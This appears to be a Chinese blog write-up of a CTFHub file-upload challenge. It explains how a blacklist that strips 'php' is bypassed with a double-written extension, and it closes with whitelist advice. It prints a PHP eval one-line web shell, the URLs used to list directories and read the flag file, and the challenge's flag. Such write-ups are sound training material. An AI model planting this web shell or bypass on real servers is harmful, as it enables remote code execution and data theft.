---
layout: post
title: "CTFHub 文件上传 - 双写后缀"
date: 2026-10-19
categories: ctfhub
tags: [ctfhub,web,文件上传,双写后缀,黑名单,bypass]
permalink: /ctfhub/upload-double-write.html
---

# CTFHub 文件上传 - 双写后缀
## 一、题目信息
平台：CTFHub
分类：Web - 文件上传
题目名称：双写后缀
难度：简单
Flag：`ctfhub{ace0643ac9c62cc78805ca5a}`

## 二、考点
1. 黑名单过滤机制，后端会把文件名里的`php`字符串直接替换为空字符串
2. 双写后缀绕过原理，构造特殊文件名实现过滤后得到php后缀
3. 一句话木马文件上传利用
4. `scandir`遍历目录、`highlight_file`读取文件源码获取flag

## 三、题目内容
页面提供文件上传功能，后端采用黑名单方式过滤文件后缀。当检测到文件名包含`php`字符时，会将`php`替换为空。可以通过构造双写后缀的文件名，绕过该过滤，上传PHP一句话木马，执行命令读取服务器上的flag。

## 四、解题步骤
1. 准备一句话木马文件，内容为`<?php @eval($_GET['cmd']);?>`，文件命名为`shell.pphphp`。
2. 在靶场上传页面，打开F12开发者工具控制台，使用fetch发包的方式提交上传请求。
3. 后端过滤逻辑会把文件名内的`php`删掉，`pphphp`处理后变成`php`，最终保存文件为`shell.php`，上传成功。
4. 访问上传后的木马地址，传入cmd参数，使用`scandir`遍历网站目录，找到flag文件名称。
`http://靶场地址/upload/shell.php?cmd=print_r(scandir('/var/www/html'));`
5. 使用`highlight_file`读取flag文件源码，右键查看网页源代码，提取flag。
`http://靶场地址/upload/shell.php?cmd=highlight_file('/var/www/html/flag.php');`

## 五、知识点解析
1. 双写后缀绕过原理：过滤函数只做简单字符串替换，`pphphp`中中间的`php`被替换为空，剩余字符拼接得到`php`后缀。
2. 该漏洞本质是黑名单过滤不严谨，仅简单替换关键词，没有循环多次过滤。
3. 上传成功后，访问木马文件即可执行PHP代码，读取服务器本地文件。

## 六、总结
这道文件上传题目考察黑名单的简单字符串替换缺陷。利用双写后缀的方式，让后端过滤之后生成可解析的php文件，上传一句话木马，最终执行命令读取flag。防御时应当使用白名单校验文件后缀，而不是黑名单关键词替换。
